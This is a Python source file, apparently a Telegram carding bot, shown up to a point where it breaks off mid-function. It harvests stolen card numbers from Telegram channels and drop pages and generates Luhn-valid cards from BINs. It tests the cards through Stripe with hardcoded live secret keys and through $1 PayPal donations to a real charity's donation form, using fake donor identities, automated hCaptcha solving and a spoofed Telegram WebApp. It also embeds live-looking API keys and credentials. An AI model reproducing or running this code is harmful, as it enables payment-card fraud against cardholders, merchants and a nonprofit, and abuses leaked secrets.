{ pkgs }: {
  deps = [
    pkgs.playwright
    pkgs.nss
    pkgs.nspr
    pkgs.atk
    pkgs.at-spi2-atk
    pkgs.cups
    pkgs.libdrm
    pkgs.libxkbcommon
    pkgs.mesa
    pkgs.xorg.libXcomposite
    pkgs.xorg.libXdamage
    pkgs.xorg.libXrandr
    pkgs.xorg.libXtst
    pkgs.xorg.libXScrnSaver
    pkgs.xorg.libX11
    pkgs.xorg.libxcb
    pkgs.gtk3
    pkgs.alsa-lib
    pkgs.dbus
    pkgs.expat
    pkgs.fontconfig
    pkgs.libXrender
    pkgs.libXfixes
    pkgs.libXcursor
    pkgs.libXi
    pkgs.pango
    pkgs.cairo
    pkgs.libGL
    pkgs.glib
    pkgs.libxshmfence
  ];
}
```

#!/usr/bin/env python3
"""
Telegram Card Checker Bot
- Fully automatic Playwright setup for Replit (one restart required)
- Mass card generation: /gen <BIN> [count]
- Stripe authorization: /st CC|MM|YY|CVV
- Extracts cards from messages and xForce drops
- Forwards results to OxyCondoneIt
"""

import re
import asyncio
import logging
import os
import random
import json
import aiohttp
import requests
import time
import hashlib
import subprocess
import sys
import shutil
import glob
from datetime import datetime, timezone
from threading import Thread
from typing import Dict, Optional

# ======================================================================
# FORCE LD_LIBRARY_PATH (fixes libnspr4.so missing on Replit)
# ======================================================================
def set_nix_library_path():
    if not (os.environ.get("REPL_ID") or os.path.exists("/home/runner/.replit")):
        return
    paths = set()
    for lib in ["libnspr4.so", "libnss3.so"]:
        try:
            result = subprocess.run(
                ["find", "/nix/store", "-name", lib, "-exec", "dirname", "{}", ";"],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.strip().splitlines():
                if line:
                    paths.add(line)
        except Exception:
            pass
    if paths:
        os.environ["LD_LIBRARY_PATH"] = ":".join(paths) + ":" + os.environ.get("LD_LIBRARY_PATH", "")
        print("[FIX] LD_LIBRARY_PATH updated for Nix libraries.")
    else:
        try:
            result = subprocess.run(
                ["find", "/nix/store", "-maxdepth", "3", "-type", "d", "-name", "lib", "-path", "*/nspr*/lib"],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.strip().splitlines():
                if line:
                    os.environ["LD_LIBRARY_PATH"] = line + ":" + os.environ.get("LD_LIBRARY_PATH", "")
                    print(f"[FIX] Added nspr lib dir: {line}")
                    break
        except Exception:
            pass

set_nix_library_path()

# ======================================================================
# Auto‑write correct .replit and replit.nix if missing or broken
# ======================================================================
def ensure_config_files():
    """Write correct .replit and replit.nix if they don't exist or are missing playwright."""
    # Write replit.nix
    nix_path = "replit.nix"
    correct_nix = '''{ pkgs }: {
  deps = [
    pkgs.playwright
    pkgs.nss
    pkgs.nspr
    pkgs.atk
    pkgs.at-spi2-atk
    pkgs.cups
    pkgs.libdrm
    pkgs.libxkbcommon
    pkgs.mesa
    pkgs.xorg.libXcomposite
    pkgs.xorg.libXdamage
    pkgs.xorg.libXrandr
    pkgs.xorg.libXtst
    pkgs.xorg.libXScrnSaver
    pkgs.xorg.libX11
    pkgs.xorg.libxcb
    pkgs.gtk3
    pkgs.alsa-lib
    pkgs.dbus
    pkgs.expat
    pkgs.fontconfig
    pkgs.libXrender
    pkgs.libXfixes
    pkgs.libXcursor
    pkgs.libXi
    pkgs.pango
    pkgs.cairo
    pkgs.libGL
    pkgs.glib
    pkgs.libxshmfence
  ];
}
'''
    need_write_nix = True
    if os.path.exists(nix_path):
        with open(nix_path, "r") as f:
            content = f.read()
            if "playwright" in content and "pkgs.playwright" in content:
                need_write_nix = False
    if need_write_nix:
        with open(nix_path, "w") as f:
            f.write(correct_nix)
        print("[FIX] Written correct replit.nix (missing playwright).")
        return True  # restart needed

    # Write .replit if missing or run command wrong
    replit_path = ".replit"
    correct_replit = 'run = "python3 007.py"\nhidden = ["replit.nix"]\n'
    need_write_replit = True
    if os.path.exists(replit_path):
        with open(replit_path, "r") as f:
            content = f.read()
            if 'run = "python3 007.py"' in content:
                need_write_replit = False
    if need_write_replit:
        with open(replit_path, "w") as f:
            f.write(correct_replit)
        print("[FIX] Written correct .replit.")
        return True  # restart needed
    return False

config_changed = ensure_config_files()
if config_changed:
    print("\n⚠️ Configuration files updated. Please STOP and RUN your Repl again.\n")
    sys.exit(0)

# ======================================================================
# Auto‑install Chromium (after Nix rebuild)
# ======================================================================
def ensure_chromium_installed():
    cache_dir = os.path.expanduser("~/.cache/ms-playwright")
    try:
        result = subprocess.run(["find", cache_dir, "-name", "chrome", "-type", "f"], capture_output=True, text=True, timeout=5)
        if result.stdout.strip():
            print("[PLAYWRIGHT] Chromium already installed.")
            return True
    except:
        pass
    print("[PLAYWRIGHT] Installing Chromium (this may take 1-2 minutes)...")
    try:
        subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"], check=True, timeout=180)
        print("[PLAYWRIGHT] Chromium installation completed.")
        for _ in range(10):
            time.sleep(1)
            try:
                result = subprocess.run(["find", cache_dir, "-name", "chrome", "-type", "f"], capture_output=True, text=True, timeout=5)
                if result.stdout.strip():
                    print("[PLAYWRIGHT] Chromium binary found.")
                    return True
            except:
                pass
    except Exception as e:
        print(f"[PLAYWRIGHT] Installation error: {e}")
    return False

CHROMIUM_INSTALLED = ensure_chromium_installed()

# ======================================================================
# Playwright setup with wrapper
# ======================================================================
PLAYWRIGHT_OK = False
PLAYWRIGHT_EXECUTABLE_PATH = None

def find_chromium_executable():
    cache_dir = os.path.expanduser("~/.cache/ms-playwright")
    try:
        result = subprocess.run(["find", cache_dir, "-name", "chrome", "-type", "f"], capture_output=True, text=True, timeout=10)
        for line in result.stdout.strip().splitlines():
            if "chrome-linux/chrome" in line:
                return line
    except:
        pass
    patterns = [
        os.path.expanduser("~/.cache/ms-playwright/chromium-*/chrome-linux/chrome"),
        os.path.expanduser("~/.cache/ms-playwright/chromium_headless_shell-*/chrome-headless-shell-linux64/chrome-headless-shell")
    ]
    for pattern in patterns:
        matches = glob.glob(pattern)
        if matches:
            return matches[0]
    return None

def create_wrapper_script(real_chrome_path):
    wrapper_dir = os.path.expanduser("~/playwright-wrapper")
    os.makedirs(wrapper_dir, exist_ok=True)
    wrapper_path = os.path.join(wrapper_dir, "chromium-wrapper.sh")
    ld_path = os.environ.get("LD_LIBRARY_PATH", "")
    content = f"""#!/bin/bash
export LD_LIBRARY_PATH="{ld_path}"
exec "{real_chrome_path}" "$@"
"""
    with open(wrapper_path, "w") as f:
        f.write(content)
    os.chmod(wrapper_path, 0o755)
    print(f"[PLAYWRIGHT] Wrapper created at {wrapper_path}")
    return wrapper_path

def setup_playwright():
    global PLAYWRIGHT_OK, PLAYWRIGHT_EXECUTABLE_PATH
    if not CHROMIUM_INSTALLED:
        print("[PLAYWRIGHT] Chromium not installed – Playwright disabled.")
        return False
    chrome_path = find_chromium_executable()
    if not chrome_path:
        print("[PLAYWRIGHT] Chromium binary not found. Please restart Repl again.")
        return False
    print(f"[PLAYWRIGHT] Found Chromium at {chrome_path}")
    wrapper = create_wrapper_script(chrome_path)
    if not wrapper:
        return False
    PLAYWRIGHT_EXECUTABLE_PATH = wrapper
    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=True,
                executable_path=wrapper,
                args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"]
            )
            browser.close()
        print("[PLAYWRIGHT] Playwright is fully working!")
        return True
    except Exception as e:
        print(f"[PLAYWRIGHT] Test failed: {e}")
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(
                    headless=True,
                    executable_path=chrome_path,
                    args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"]
                )
                browser.close()
            print("[PLAYWRIGHT] Playwright works with direct binary.")
            PLAYWRIGHT_EXECUTABLE_PATH = chrome_path
            return True
        except Exception as e2:
            print(f"[PLAYWRIGHT] Direct binary also failed: {e2}")
        return False

PLAYWRIGHT_OK = setup_playwright()

if PLAYWRIGHT_OK:
    from playwright.async_api import async_playwright
else:
    print("[WARN] Playwright not available. xForce drops will be disabled.")
    class async_playwright:
        async def __aenter__(self): return self
        async def __aexit__(self, *args): pass
        def chromium(self):
            class Dummy:
                async def launch(self, **kwargs):
                    raise RuntimeError("Playwright unavailable")
            return Dummy()

# ======================================================================
# Capsolver
# ======================================================================
import capsolver
CAPSOLVER_API_KEY = "CAP-AB1D4F1328B6EECA1ED6C2E538C4A9C45F0945D2407DDA96C8F3B7A472275EAD"
capsolver.api_key = CAPSOLVER_API_KEY

# ======================================================================
# Stripe Keys (live)
# ======================================================================
STRIPE_KEYS = [
    "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",
    "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"
]

# ======================================================================
# Flask web server
# ======================================================================
from flask import Flask, jsonify
flask_app = Flask(__name__)
BOT_USERNAME = "Oxy"
PORT = int(os.environ.get("PORT", 8080))
RUN_MODE = os.environ.get("RUN_MODE", "both").lower()

@flask_app.route('/')
def home():
    return jsonify({
        "status": "alive",
        "bot": BOT_USERNAME,
        "version": "23.0",
        "uptime": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "run_mode": RUN_MODE,
        "playwright_ok": PLAYWRIGHT_OK
    })
@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "bot": BOT_USERNAME})

def run_flask():
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

# ======================================================================
# Logging
# ======================================================================
logging.basicConfig(
    filename="scraper.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger()

# ======================================================================
# Telegram configuration
# ======================================================================
API_ID = 37079398
API_HASH = "678f499b4345b640ba83ed7b1fc1efc0"
SESSION_NAME = "mysession"
SOURCE_CHATS_RAW = [
    "https://t.me/+01N1N0nFYEA4MWRl",
    "newscrapper4",
    "cc_checker_Stuff",
    "xForceDropsBot",
    "X-Force Group",
]
XFORCE_BOT_USERNAME = "xForceDropsBot"
FORWARD_TARGET = "OxyCondoneIt"

from telethon import TelegramClient, events
from telethon.errors import UserAlreadyParticipantError, FloodWaitError
from telethon.tl.functions.messages import ImportChatInviteRequest, CheckChatInviteRequest, RequestAppWebViewRequest
from telethon.tl.types import InputBotAppShortName, DataJSON

client = TelegramClient(SESSION_NAME, API_ID, API_HASH)

# ======================================================================
# Card detection patterns
# ======================================================================
CARD_RE_SIMPLE = re.compile(r"\b(\d{15,16})\s*[|\/]\s*(\d{1,2})\s*[|\/]\s*(\d{2,4})\s*[|\/]\s*(\d{3,4})\b")
CARD_RE_FORMATTED = re.compile(r"[❃]?\s*𝗖𝗮𝗿𝗱\s*[➜-]?\s*`?(\d{15,16})\s*[|\/]\s*(\d{1,2})\s*[|\/]\s*(\d{2,4})\s*[|\/]\s*(\d{3,4})")
CARD_RE_LOOSE = re.compile(r"(\d{15,16})\s*[|\/]\s*(\d{1,2})\s*[|\/]\s*(\d{2,4})\s*[|\/]?\s*(\d{3,4})?")

def extract_card_from_text(text: str):
    for pattern in [CARD_RE_SIMPLE, CARD_RE_FORMATTED, CARD_RE_LOOSE]:
        m = pattern.search(text)
        if m:
            groups = m.groups()
            if len(groups) >= 4:
                card = groups[0]
                mm = groups[1]
                yy = groups[2]
                cvv = groups[3] if groups[3] else "000"
                if len(cvv) < 3: cvv = "000"
                if len(yy) == 2: yy = f"20{yy}"
                return (card, mm, yy, cvv)
            elif len(groups) >= 3:
                card = groups[0]
                mm = groups[1]
                yy = groups[2]
                cvv = "000"
                if len(yy) == 2: yy = f"20{yy}"
                return (card, mm, yy, cvv)
    return None

# ======================================================================
# BIN lookup
# ======================================================================
async def get_bin_info(bin6: str) -> dict:
    url = f"https://lookup.binlist.net/{bin6}"
    headers = {"Accept-Version": "3"}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json(content_type=None)
                    return {
                        "bank": data.get("bank", {}).get("name", "Unknown Bank"),
                        "brand": data.get("scheme", "UNKNOWN").upper(),
                        "type": data.get("type", "UNKNOWN").upper(),
                        "country": data.get("country", {}).get("name", "Unknown"),
                        "country_code": data.get("country", {}).get("alpha2", "XX"),
                        "prepaid": data.get("prepaid", False),
                        "level": data.get("brand", "STANDARD").upper(),
                    }
    except:
        pass
    return None

# ======================================================================
# Stripe Authorizer
# ======================================================================
def stripe_authorize(card_str: str) -> str:
    parts = card_str.split("|")
    if len(parts) < 4:
        return "ERROR|Invalid format"
    number, month, year, cvc = parts[0], parts[1], parts[2], parts[3]
    if len(year) == 2:
        year = "20" + year
    for key in STRIPE_KEYS:
        headers = {
            "Authorization": f"Bearer {key}",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = {
            "type": "card",
            "card[number]": number,
            "card[exp_month]": month,
            "card[exp_year]": year,
            "card[cvc]": cvc
        }
        try:
            response = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data, timeout=15)
            if response.status_code == 200:
                return "AUTHORIZED ✅|PaymentMethod created"
            elif response.status_code == 402:
                err = response.json().get("error", {}).get("message", "Card declined")
                return f"DECLINED ❌|{err}"
            else:
                err_msg = response.json().get("error", {}).get("message", "Unknown error")
                if "incorrect" in err_msg.lower() or "invalid" in err_msg.lower():
                    return f"DECLINED ❌|{err_msg}"
                continue
        except Exception:
            continue
    return "ERROR|All Stripe keys failed"

# ======================================================================
# PayPal checker (full version)
# ======================================================================
FORM_VIEW_URL = "https://binnaclehouse.org/?givewp-route=donation-form-view&form-id=3945"
AJAX_URL = "https://binnaclehouse.org/wp-admin/admin-ajax.php"
FORM_ID = "3945"

_BASE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
}

class PayPalCharger:
    def __init__(self, proxy: Optional[str] = None):
        self.session = requests.Session()
        self.session.headers.update(_BASE_HEADERS)
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

    def _get_form_data(self) -> Dict[str, str]:
        self.session.get("https://binnaclehouse.org/donation/", timeout=15)
        r = self.session.get(FORM_VIEW_URL, timeout=20)
        r.raise_for_status()
        m = re.search(r"window\.givewpDonationFormExports\s*=\s*(\{.*?\});\s*[\n\r]", r.text, re.S)
        if not m:
            raise RuntimeError("givewpDonationFormExports block not found")
        blob = m.group(1)
        def _extract(key: str) -> str:
            match = re.search(rf'"{key}"\s*:\s*"([^"]+)"', blob)
            return match.group(1).replace("\\/", "/") if match else ""
        nonce = _extract("donationFormNonce")
        client_id = _extract("clientId")
        if not nonce or not client_id:
            raise RuntimeError("Missing nonce or clientId")
        return {"nonce": nonce, "client_id": client_id}

    def _create_order(self, nonce: str) -> str:
        resp = self.session.post(
            AJAX_URL,
            params={"action": "give_paypal_commerce_create_order"},
            data={
                "give-honeypot": "",
                "give-form-id": FORM_ID,
                "give-form-hash": nonce,
                "give-form-id-prefix": f"give-{FORM_ID}-0",
                "give-amount": "1.00",
                "give-gateway": "paypal-commerce",
                "payment-mode": "paypal-commerce",
            },
            headers={"X-Requested-With": "XMLHttpRequest"},
            timeout=20,
        )
        res = resp.json()
        if res.get("success") and "data" in res:
            return res["data"]["id"]
        raise RuntimeError(f"Order creation failed: {resp.text[:150]}")

    def _submit_payment(self, order_id: str, n: str, mm: str, yy: str, cvc: str, donor: Dict[str, str]) -> str:
        ua = self.session.headers["User-Agent"]
        headers = {
            "Host": "www.paypal.com",
            "Paypal-Client-Context": order_id,
            "X-App-Name": "standardcardfields",
            "Paypal-Client-Metadata-Id": order_id,
            "User-Agent": ua,
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Origin": "https://www.paypal.com",
            "Referer": f"https://www.paypal.com/smart/card-fields?token={order_id}",
        }
        query = """
        mutation payWithCard(
            $token: String! $card: CardInput $phoneNumber: String
            $firstName: String $lastName: String
            $shippingAddress: AddressInput $billingAddress: AddressInput
            $email: String $currencyConversionType: CheckoutCurrencyConversionType
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token card: $card phoneNumber: $phoneNumber
                firstName: $firstName lastName: $lastName email: $email
                shippingAddress: $shippingAddress billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
            ) {
                flags { is3DSecureRequired }
                cart { cartId }
            }
        }"""
        d_postal = donor.get("postal", "99901")
        address = {
            "givenName": donor["first_name"],
            "familyName": donor["last_name"],
            "line1": donor.get("line1", "5112 N Tongass Hwy"),
            "line2": None,
            "city": donor.get("city", "Ketchikan"),
            "state": donor.get("state", "AK"),
            "postalCode": d_postal,
            "country": "US",
        }
        card_type = self._detect_card_type(n)
        full_year = yy if len(yy) == 4 else f"20{yy}"
        _phone = f"{random.choice(['206','312','404','512','614','702','803','904','214','303'])}{random.randint(1000000,9999999)}"
        variables = {
            "token": order_id,
            "card": {
                "cardNumber": n,
                "type": card_type,
                "expirationDate": f"{mm}/{full_year}",
                "postalCode": d_postal,
                "securityCode": cvc,
            },
            "phoneNumber": _phone,
            "firstName": donor["first_name"],
            "lastName": donor["last_name"],
            "email": donor["email"],
            "billingAddress": address,
            "shippingAddress": address,
            "currencyConversionType": "PAYPAL",
        }
        try:
            self.session.get(
                f"https://www.paypal.com/smart/card-fields?token={order_id}&env=production",
                headers={"Referer": "https://binnaclehouse.org/donation/", "Accept": "text/html"},
                timeout=15,
            )
        except:
            pass
        resp = None
        for attempt in range(3):
            try:
                resp = self.session.post(
                    "https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard",
                    headers=headers,
                    json={"query": query, "variables": variables},
                    timeout=45,
                )
                if resp.status_code == 429:
                    time.sleep(int(resp.headers.get("Retry-After", 10)))
                    continue
                break
            except:
                continue
        if resp is None or not resp.text.strip():
            return "DECLINED|No response"
        try:
            res = resp.json()
        except:
            return f"PARSE_ERROR|{resp.text[:120]}"
        if "errors" in res:
            err_msg = res["errors"][0].get("message", "Unknown")
            code = res["errors"][0].get("data", [{}])[0].get("code", "")
            full = f"{err_msg} ({code})" if code else err_msg
            hits = [
                "INVALID_BILLING_ADDRESS", "INVALID_SECURITY_CODE", "CVV2_FAILURE",
                "INSTRUMENT_DECLINED", "DO_NOT_HONOR", "3D_SECURE"
            ]
            if any(k in full.upper() for k in hits):
                return f"APPROVED|{full}"
            return f"DECLINED|{full}"
        if res.get("data", {}).get("approveGuestPaymentWithCreditCard"):
            return "CHARGED|Payment successful"
        return f"UNKNOWN|{resp.text[:150]}"

    @staticmethod
    def _detect_card_type(n: str) -> str:
        n = n.replace(" ", "").replace("-", "")
        if n.startswith("4"): return "VISA"
        if re.match(r"^5[1-5]|^2[2-7]", n): return "MASTER_CARD"
        if n.startswith(("34", "37")): return "AMEX"
        if n.startswith(("6011", "65")) or re.match(r"^64[4-9]", n): return "DISCOVER"
        return "VISA"

    @staticmethod
    def _random_donor() -> Dict[str, str]:
        _FIRST = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles","Sarah","Jessica"]
        _LAST = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Wilson","Taylor","Anderson"]
        _STREETS = [
            ("142 Maple Ave", "Springfield", "IL", "62701"),
            ("87 Oak Street", "Columbus", "OH", "43201"),
            ("1204 Pine Rd", "Charlotte", "NC", "28201"),
            ("330 Birch Blvd", "Phoenix", "AZ", "85001"),
            ("560 Cedar Lane", "Austin", "TX", "73301"),
        ]
        first = random.choice(_FIRST)
        last = random.choice(_LAST)
        line1, city, state, postal = random.choice(_STREETS)
        email = f"{first.lower()}.{last.lower()}{random.randint(10,9999)}@gmail.com"
        return {
            "first_name": first,
            "last_name": last,
            "email": email,
            "line1": line1,
            "city": city,
            "state": state,
            "postal": postal,
        }

    def charge(self, cc: str) -> str:
        parts = cc.strip().split("|")
        if len(parts) < 4:
            return "ERROR|Invalid format"
        n, mm, yy, cvc = parts[:4]
        if len(yy) == 4:
            yy = yy[2:]
        donor = self._random_donor()
        try:
            form_data = self._get_form_data()
            order_id = self._create_order(form_data["nonce"])
            return self._submit_payment(order_id, n, mm, yy, cvc, donor)
        except Exception as e:
            return f"ERROR|{e}"

# ======================================================================
# Card generation (Luhn) with mass generation
# ======================================================================
def luhn_sum(card: str) -> int:
    total = 0
    for i, ch in enumerate(card[::-1]):
        n = int(ch)
        if i % 2 == 1:
            n *= 2
            if n > 9: n -= 9
        total += n
    return total

def generate_card_number(bin_prefix: str) -> str:
    bin_prefix = bin_prefix[:6]
    is_amex = bin_prefix[:2] in ("34", "37")
    length = 15 if is_amex else 16
    fill_len = length - len(bin_prefix) - 1
    body = bin_prefix + "".join(str(random.randint(0,9)) for _ in range(fill_len))
    for check in range(10):
        candidate = body + str(check)
        if luhn_sum(candidate) % 10 == 0:
            return candidate
    return body + "0"

def generate_expiry():
    return f"{random.randint(1,12):02d}", str(random.randint(2025,2032))

def generate_cvv(card: str) -> str:
    return str(random.randint(1000,9999)) if card[:2] in ("34","37") else str(random.randint(100,999))

def generate_card_with_bin(bin_prefix: str) -> str:
    card = generate_card_number(bin_prefix)
    mm, yy = generate_expiry()
    cvv = generate_cvv(card)
    return f"{card}|{mm}|{yy}|{cvv}"

# ======================================================================
# xForce automation (full Playwright)
# ======================================================================
def xlog(tag: str, msg: str):
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    print(f"[{ts}] [xForce/{tag}] {msg}", flush=True)
    logger.info(msg)

class XForceAutomator:
    RETRY_LIMIT = 3
    RETRY_TIMEOUT = 30

    def __init__(self, bot_client, target_group):
        self.bot_client = bot_client
        self.target_group = target_group
        self.processed_links = set()
        self.processed_cards = set()
        self._drop_queue = asyncio.Queue()
        self._worker_task = None
        self._pending = {}

    def _log(self, tag: str, msg: str):
        xlog(tag, msg)

    async def solve_hcaptcha(self, page):
        if not PLAYWRIGHT_OK:
            return False
        try:
            iframe = await page.query_selector('iframe[src*="hcaptcha"]')
            if not iframe:
                self._log("captcha", "No hCaptcha iframe found — skipping")
                return True
            self._log("captcha", "hCaptcha iframe detected, extracting sitekey...")
            sitekey = await page.evaluate("""
                () => {
                    const elem = document.querySelector('.h-captcha');
                    if (elem) return elem.getAttribute('data-sitekey');
                    const iframe = document.querySelector('iframe[src*="hcaptcha"]');
                    if (iframe && iframe.src) {
                        const match = iframe.src.match(/sitekey=([^&]+)/);
                        return match ? match[1] : null;
                    }
                    return null;
                }
            """)
            if not sitekey:
                self._log("captcha", "Could not extract sitekey — skipping")
                return True
            self._log("captcha", f"Sitekey: {sitekey[:20]}... — sending to Capsolver")
            solution = capsolver.solve({
                "type": "HCaptchaTaskProxyless",
                "websiteURL": page.url,
                "websiteKey": sitekey,
            })
            token = solution.get("gRecaptchaResponse", "")
            if not token:
                self._log("captcha", "Capsolver returned empty token")
                return False
            await page.evaluate(f"""
                () => {{
                    const response = '{token}';
                    const respElement = document.querySelector('[name="h-captcha-response"]');
                    if (respElement) respElement.value = response;
                    const captchaElem = document.querySelector('.h-captcha');
                    if (captchaElem) {{
                        const event = new Event('submit', {{ bubbles: true }});
                        captchaElem.dispatchEvent(event);
                    }}
                }}
            """)
            self._log("captcha", "hCaptcha injected and submitted ✅")
            await page.wait_for_timeout(2000)
            return True
        except Exception as e:
            self._log("captcha", f"ERROR: {e}")
            return False

    async def extract_card_from_page(self, page):
        try:
            await page.wait_for_timeout(3000)
            content = await page.content()
            for pattern in [CARD_RE_SIMPLE, CARD_RE_LOOSE]:
                match = pattern.search(content)
                if match:
                    groups = match.groups()
                    if len(groups) >= 4:
                        return groups
                    elif len(groups) >= 3:
                        return (groups[0], groups[1], groups[2], "000")
            return None
        except Exception as e:
            self._log("extract", f"ERROR: {e}")
            return None

    async def _resolve_webapp_url(self, link: str) -> Optional[str]:
        m = re.match(r'https?://t\.me/([^/?#]+)/([^/?#]+)\?startapp=([^\s&]+)', link)
        if not m:
            return None
        bot_username, short_name, start_param = m.groups()
        try:
            bot_input = await self.bot_client.get_input_entity(bot_username)
            result = await self.bot_client(RequestAppWebViewRequest(
                peer=bot_input,
                app=InputBotAppShortName(bot_id=bot_input, short_name=short_name),
                platform="android",
                start_param=start_param,
                theme_params=DataJSON(data="{}"),
            ))
            return result.url
        except Exception as e:
            self._log("webapp", f"Could not resolve mini app URL: {e}")
            return None

    @staticmethod
    def _build_tgwebapp_script(url: str) -> str:
        import urllib.parse
        init_data = ""
        try:
            if "#" in url:
                fragment = url.split("#", 1)[1]
                params = urllib.parse.parse_qs(fragment, keep_blank_values=True)
                raw = params.get("tgWebAppData", [""])[0]
                init_data = urllib.parse.unquote(raw)
        except Exception:
            pass
        safe = init_data.replace("\\", "\\\\").replace("`", "\\`")
        return f"""
(() => {{
    const _initData = `{safe}`;
    const _tgwa = {{
        initData: _initData,
        initDataUnsafe: {{}},
        version: "7.2",
        platform: "android",
        colorScheme: "dark",
        themeParams: {{
            bg_color: "#212121", text_color: "#ffffff", hint_color: "#aaaaaa",
            link_color: "#8774e1", button_color: "#8774e1", button_text_color: "#ffffff",
            secondary_bg_color: "#181818"
        }},
        isExpanded: true,
        viewportHeight: 720,
        viewportStableHeight: 720,
        headerColor: "#212121",
        backgroundColor: "#212121",
        isClosingConfirmationEnabled: false,
        ready: () => {{}},
        expand: () => {{}},
        close: () => {{}},
        sendData: () => {{}},
        openLink: (u) => {{ try {{ window.open(u, "_blank"); }} catch(e) {{}} }},
        openTelegramLink: () => {{}},
        showAlert: (m, cb) => {{ if (cb) cb(); }},
        showConfirm: (m, cb) => {{ if (cb) cb(true); }},
        showPopup: (p, cb) => {{ if (cb) cb("ok"); }},
        enableClosingConfirmation: () => {{}},
        disableClosingConfirmation: () => {{}},
        setHeaderColor: () => {{}},
        setBackgroundColor: () => {{}},
        MainButton: {{
            text: "CONTINUE", color: "#8774e1", textColor: "#ffffff",
            isVisible: false, isActive: true, isProgressVisible: false,
            show: ()=>{{}}, hide: ()=>{{}}, enable: ()=>{{}}, disable: ()=>{{}},
            showProgress: ()=>{{}}, hideProgress: ()=>{{}},
            setText: ()=>{{}}, onClick: ()=>{{}}, offClick: ()=>{{}}
        }},
        BackButton: {{ isVisible: false, show:()=>{{}}, hide:()=>{{}}, onClick:()=>{{}}, offClick:()=>{{}} }},
        HapticFeedback: {{ impactOccurred:()=>{{}}, notificationOccurred:()=>{{}}, selectionChanged:()=>{{}} }}
    }};
    window.Telegram = {{ WebApp: _tgwa }};
    Object.defineProperty(window, "TelegramWebApp", {{ get: () => _tgwa }});
}})();
"""

    async def _click_page_action_buttons(self, page) -> bool:
        if not PLAYWRIGHT_OK:
            return False
        selectors = [
            'button:has-text("Get")', 'button:has-text("Claim")', 'button:has-text("Show")',
            'button:has-text("Reveal")', 'button:has-text("Open")', 'button:has-text("Visit")',
            'button:has-text("View")', 'button:has-text("Drop")',
            'a:has-text("Get")', 'a:has-text("Claim")', 'a:has-text("Show")', 'a:has-text("Reveal")',
            '.btn-primary', '.btn-main', '.btn-action',
            '[class*="button"][class*="primary"]', '[class*="button"][class*="main"]',
        ]
        for sel in selectors:
            try:
                el = await page.query_selector(sel)
                if el and await el.is_visible():
                    txt = (await el.inner_text()).strip()[:40]
                    self._log("browser", f"Clicking page button: '{txt}' ({sel})")
                    await el.click()
                    return True
            except Exception:
                continue
        return False

    def _ensure_worker(self):
        if self._worker_task is None or self._worker_task.done():
            self._worker_task = asyncio.ensure_future(self._queue_worker())
            self._log("queue", "Drop queue worker started")

    async def _queue_worker(self):
        self._log("queue", "Worker ready — waiting for drops...")
        while True:
            try:
                link, tg_script = await self._drop_queue.get()
                depth = self._drop_queue.qsize()
                self._log("queue", f"Processing drop ({depth} remaining in queue): {link[:70]}")
                await self._run_browser_session(link, tg_script)
            except asyncio.CancelledError:
                self._log("queue", "Worker cancelled — exiting")
                break
            except Exception as e:
                self._log("queue", f"Worker caught unexpected error: {e}")
            finally:
                try:
                    self._drop_queue.task_done()
                except Exception:
                    pass

    async def _run_browser_session(self, link: str, tg_script: str):
        if not PLAYWRIGHT_OK or not PLAYWRIGHT_EXECUTABLE_PATH:
            self._log("browser", "Playwright not available – cannot process drop link")
            return
        self._log("browser", f"Launching browser for: {link[:80]}")
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=True,
                    executable_path=PLAYWRIGHT_EXECUTABLE_PATH,
                    args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"]
                )
                try:
                    context = await browser.new_context(
                        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
                        viewport={"width": 390, "height": 844},
                    )
                    await context.add_init_script(tg_script)
                    page = await context.new_page()
                    await page.goto(link, wait_until="domcontentloaded", timeout=30000)
                    self._log("browser", f"Page loaded: {page.url[:80]}")
                    await page.wait_for_timeout(4000)

                    await self.solve_hcaptcha(page)
                    await page.wait_for_timeout(1000)

                    clicked = await self._click_page_action_buttons(page)
                    if clicked:
                        self._log("browser", "Action button clicked — waiting for content...")
                        await page.wait_for_timeout(4000)
                        await self.solve_hcaptcha(page)
                        await page.wait_for_timeout(2000)
                    else:
                        self._log("browser", "No action button found on page")

                    card_data = await self.extract_card_from_page(page)
                    if not card_data:
                        self._log("browser", "No card on first pass — retrying in 5s...")
                        await page.wait_for_timeout(5000)
                        await self._click_page_action_buttons(page)
                        await page.wait_for_timeout(2000)
                        card_data = await self.extract_card_from_page(page)

                    if card_data:
                        n, mm, yy, cvv = card_data[0], card_data[1], card_data[2], (card_data[3] or "000")
                        card_hash = hashlib.md5(f"{n}|{mm}|{yy}|{cvv}".encode()).hexdigest()
                        if card_hash in self.processed_cards:
                            self._log("browser", f"Duplicate card {n[:4]}...{n[-4:]} — skipping")
                        else:
                            self.processed_cards.add(card_hash)
